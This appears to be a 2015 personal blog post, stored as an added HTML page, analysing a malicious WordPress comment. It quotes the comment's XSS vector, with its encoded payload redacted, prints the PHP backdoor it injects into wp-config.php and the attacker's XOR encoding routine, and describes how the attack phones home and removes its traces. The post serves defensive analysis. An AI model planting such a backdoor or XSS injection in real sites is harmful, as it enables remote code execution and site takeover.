@@ -1,0 +1,261 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+        <meta name="description" content="The personal website of Brandon Silver." />
+        <meta name="keywords" content="wordpress,security,code,analysis,encryption" />
+        <title>Exploring malicious wordpress comment spam | www.BrandonSilver.com</title>
+        <link rel="stylesheet" href="/css/style.css" type="text/css" />
+        <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+    </head>
+    <body>
+        <div id="container">
+            <div id="header"><h1><a href="http://www.brandonsilver.com">www.BrandonSilver.com</a></h1></div>
+            <div id="sub_header">... writings and miscellaneous musings</div>
+            <div id="main_content_top"></div>
+            <div id="main_content">
+                <div class="content">
+                    <span class="post_date"> 07 January 2015 </span>
+<h2><a href="  "> Exploring malicious wordpress comment spam </a></h2>
+
+
+<p><strong>DISCLAIMER:</strong> The contents of this post may contain code that is unsafe to run. The
+purpose of this post is purely exploratory and meant for defensive purposes, and not as an intro to
+1337 hax0ring. If you use the knowledge below for bad, don&#39;t blame me when the feds&#39; party van comes
+for you. Your actions are your own.</p>
+
+<h3>Introduction</h3>
+
+<p>I manage a few WordPress websites in my spare time. Most of the sites don&#39;t have comments enabled,
+but a few do, so on occasion I&#39;ll be alerted to new comments. The majority of those comments are
+spam (usually having something to do with advertising SEO opportunities) and thus are left in the
+purgatory of the moderation queue. However, one would-be comment was different from the usual
+fake-SEO tripe. This post will examine this particular comment and explore its malicious properties.</p>
+
+<p><em>Tl;dr? see the summary at the bottom of this post.</em></p>
+
+<!--more-->
+
+<h3>The raw comment</h3>
+
+<p>This is the email notification I received when the comment was created. It includes the relevant
+metadata as well as the raw comment itself:</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">A new comment on the post &quot;Post&quot; is waiting for your approval
+POST-URL
+
+Author : Wasia (IP: 50.63.194.123 , p3nlhg1391.shr.prod.phx3.secureserver.net)
+E-mail : aaa@aaa.com
+URL    :
+Whois  : http://whois.arin.net/rest/ip/50.63.194.123
+Comment:
+Welcome to WordPress. This is your first post. [&lt;a title=&quot;]&quot; rel=&quot;nofollow&quot;&gt;&lt;/a&gt;[\&quot; &lt;!--
+style=\&#39;position:fixed;top:0px;left:0px;width:6000px;height:6000px;color:transparent;z-index:999999999\&#39;
+onmouseover=&quot;eval(atob(\&#39;naughty-javascript-in-base-64-goes-here&#39;))&quot; &amp;gt; --&gt;&lt;a&gt;&lt;/a&gt;] Edit or delete it, then start blogging!
+
+Approve it: APPROVE-URL
+Trash it: TRASH-URL
+Spam it: SPAM-URL
+Currently 100 comments are waiting for approval. Please visit the moderation panel:
+PANEL-URL</code></pre></div>
+
+<p>The comment appears to be setup to force anyone who visits the page it inhabits to run some
+obfuscated javascript (the large chunk of characters within the <code>eval(atob())</code> ).</p>
+
+<h3>De-obfuscating the comment&#39;s JavaScript</h3>
+
+<p>De-obfuscation of the javascript is accomplished by decoding the block of characters inside of the
+atob() function call from base-64. It&#39;s now clear that this script is trying to create an iframe on
+the page and fill it with the wordpress installation&#39;s plugin editor in order to edit the
+<code>hello.php</code> plugin. If the desired changes have already been made, then it will instead
+set the iframe to run the modified <code>hello.php</code> script.</p>
+
+<h3>De-obfuscating the JavaScript&#39;s PHP payload</h3>
+
+<p>But what are those changes? The answer might be found by decoding the base-64
+string inside of <code>hhh.getElementById(&quot;newcontent&quot;).value = atob(...);</code>, since that&#39;s what
+is being added to <code>hello.php</code>. </p>
+
+<h3>Overview of the modifications to hello.php</h3>
+
+<p>The main target of the attack appears to be <code>wp-config.php</code>, a file that holds important
+settings for WordPress sites (like database access credentials). The script injects some code into
+<code>wp-config.php</code> (reproduced in a more readable form below):</p>
+
+<h4>Injection into wp-config.php</h4>
+
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-php" data-lang="php">1
+2
+3
+4
+5
+6</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;FILE&#39;</span><span class="p">])){</span>
+    <span class="nv">$_FILE</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;unique-value-here&#39;</span><span class="p">](</span><span class="s1">&#39;$_&#39;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;FILE&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;($_);&#39;</span><span class="p">);</span>
+    <span class="nv">$_FILE</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;HOST&#39;</span><span class="p">]));</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</td></tr></table>
+
+<p>It appears that by adding this code the attacker can execute arbitrary code contained in a
+specially-crafted request to <code>wp-config.php</code>. Specifically, any request with the &#39;FILE&#39;
+variable set will execute the code supplied by the request variable with the same name as a unique
+ID generated previously in the script.</p>
+
+<p>Next, the script moves to correct the permissions of <code>wp-config.php</code> in order to prevent
+other attackers from gaining control (a consistent theme in this script, as will be shown below).
+Another consistent theme of this attack is the clever hiding of modified files&#39; modification dates.
+This ensures that a simple directory listing doesn&#39;t give away that the exploit has occurred. </p>
+
+<h4>Phoning home: report()</h4>
+
+<p>In order for the attacker to make use of the now-compromised site, it is necessary for them to
+obtain the unique ID in the script. The <code>report()</code> function sends that and the WordPress
+installation&#39;s host to a hardcoded list of sites. The reporting action is accomplished via a series
+of HTTP GET requests containing this information as a URL parameter.</p>
+
+<h4>Basic encryption: Uno_encode()</h4>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">Uno_encode</span><span class="p">(</span><span class="nv">$String</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$Salt</span><span class="o">=</span><span class="s1">&#39;dc5p9dOpBc&#39;</span><span class="p">;</span>
+    <span class="nv">$StrLen</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$String</span><span class="p">);</span>
+    <span class="nv">$Seq</span> <span class="o">=</span> <span class="s1">&#39;DMEf5HZuPq&#39;</span><span class="p">;</span>
+    <span class="nv">$Gamma</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$Gamma</span><span class="p">)</span><span class="o">&lt;</span><span class="nv">$StrLen</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$Seq</span> <span class="o">=</span> <span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H*&quot;</span><span class="p">,</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$Gamma</span><span class="o">.</span><span class="nv">$Seq</span><span class="o">.</span><span class="nv">$Salt</span><span class="p">));</span>
+        <span class="nv">$Gamma</span><span class="o">.=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$Seq</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$String</span><span class="o">^</span><span class="nv">$Gamma</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<p>The data reported back to the attackers is first encrypted by the <code>Uno_encode()</code>
+function. It&#39;s notable because it doesn&#39;t use a standard cryptosystem (like AES or RSA);
+instead, it takes a much simpler approach by creating a sort of static key and then XORing it with
+the string to be encrypted. Decryption can be accomplished by sending the base-64 decoded ciphertext
+through the same function, like this:</p>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">Uno_decode</span><span class="p">(</span><span class="nv">$String</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nx">Uno_encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$String</span><span class="p">)));</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<p>Of course, this requires that you know the values for <code>$Salt</code> and <code>$Seq</code> (as
+well as the rest of the algorithm), so it&#39;s reasonably secure as long as those secrets aren&#39;t known.
+Unfortunately for the attackers, now they <em>are</em> known, and they now wish they had chosen an asymmetric
+algorithm instead (since exposing a public key wouldn&#39;t have also exposed their communications).</p>
+
+<h4>Self-patching and self-removal</h4>
+
+<p>After modifying <code>wp-config.php</code> and reporting back, the script takes steps to hide its
+tracks and secure the injected code&#39;s place in the WordPress installation. First, it removes the
+original malicious comment from the MySQL database. Next, it patches the WordPress installation by
+modifying the <code>wp-comments-post.php</code> file to completely block the posting of new
+comments. It&#39;s definitely a sledgehammer approach to fixing the vulnerability used in this exploit,
+but it works as long as no one gets curious as to why new comments can&#39;t be posted. Finally, the
+script removes itself from <code>hello.php</code>. It uses an MD5 hash value at the bottom of the script
+as a boundary marker to indicate where the malicious script ends and the original content begins. </p>
+
+<h3>Summary</h3>
+
+<p>This exploit originates as a comment designed to look like the default WordPress post. The first
+time it&#39;s viewed it runs some JavaScript which adds the PHP listed above to a plugin,
+<code>hello.php</code>. The second time the comment is viewed it executes the plugin, in turn
+running code that</p>
+
+<ol>
+<li>injects more PHP into the WordPress installation&#39;s settings file,
+<code>wp-config.php</code>,</li>
+<li>sends information back to the attackers (allowing them to execute
+arbitrary code with a specially-crafted request using the injected code from 1.),</li>
+<li>removes the comment, and</li>
+<li>removes the malicious code added to <code>hello.php</code>.</li>
+</ol>
+
+<h4>Requirements for vulnerability</h4>
+
+<p>Now that I&#39;ve gone through the exploit I think I can speculate as to what it would take for a
+WordPress site to be vulnerable to it. It seems to require the following to be true:</p>
+
+<ol>
+<li>Commenting must be enabled</li>
+<li>Commenting must be open to everyone</li>
+<li>Comments must be automatically approved (no moderation queue)</li>
+<li>The web server must be able to write to the WordPress installation directory</li>
+</ol>
+
+<h3>Final thoughts</h3>
+
+<p>Something that struck me as odd was that there wasn&#39;t an immediate attempt to exfiltrate the
+database access credentials. Wouldn&#39;t a list of valid credentials be valuable?</p>
+
+<h3>BONUS -- A CONNECTION TO ANOTHER EXPLOIT?!</h3>
+
+<p>I got curious about the MD5 hash (<code>49de371511c1de3bde34b0108ec7f129</code>) at the bottom of
+the PHP code that gets added to <code>hello.php</code> and did some googling. <a href="https://www.planetspork.com/w/2014/11/this-seems-interesting/">This
+guy</a> had someone try to use
+shellshock to add some PHP to his site, and as part of the PHP&#39;s access control it compares the MD5
+of the requesting browser&#39;s user agent to the MD5 hash value listed at the bottom of the PHP in this exploit.
+It seems that the same entity might be responsible for both exploits.</p>
+
+<h3>References / Resources Used</h3>
+
+<ul>
+<li><a href="https://www.base64decode.org/">Base-64 decoder</a> to decode the base-64 strings</li>
+<li><a href="http://www.w3schools.com/jsref/met_win_atob.asp">w3schools</a> to brush up on basic JavaScript</li>
+<li><a href="http://php.net/manual/en/index.php">The PHP Manual</a> for a refresher on common PHP functions</li>
+<li>The #crypto channel on the <a href="http://freenode.net/">Freenode IRC network</a></li>
+</ul>
+
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'brandonsilver'; // required: replace example with your forum shortname
+
+    // The following are highly recommended additional parameters. Remove the slashes in front to use.
+    var disqus_identifier = '/2015/01/07/exploring-malicious-wordpress-spam.html';
+    var disqus_url = 'http://www.brandonsilver.com/2015/01/07/exploring-malicious-wordpress-spam.html';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js?https';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+                </div>
+                <div class="menu">
+                    <div class="menu_title">This website</div>
+                    <ul>
+                        <li><a href="/index.html" class="menu_link">Home</a></li>
+                        <li><a href="/archives.html" class="menu_link">Blog Archives</a></li>
+                        <li><a href="/links.html" class="menu_link">Useful Links</a></li>
+                        <li><a href="/atom.xml" class="menu_link">Subscribe via RSS!</a></li>
+                        </ul>
+                        <div class ="menu_title">Around the web</div>
+                        <ul>
+                            <li><a href="https://github.com/brandonsilver/" class="menu_link">Github</a></li>
+                            <li><a href="https://www.facebook.com/brandon.silver2" class="menu_link">Facebook</a></li>
+                            <li><a href="https://www.twitter.com/alinuxuser" class="menu_link">Twitter</a></li>
+                        </ul>
+                        <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/alinuxuser"  data-widget-id="315684609713127424">Tweets by @alinuxuser</a>
+                        <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+                </div>
+                <div id="clear"></div>
+            </div>
+            <div id="main_content_bottom"></div>
+            <div id="footer"><strong>Copyright &copy; 2010-2015 <a href="https://www.brandonsilver.com/">Brandon Silver</a></strong> | Last updated on <strong> 2015-01-07 07:13:18 -0600 </strong></div>
+        </div>
+    </body>
+</html>
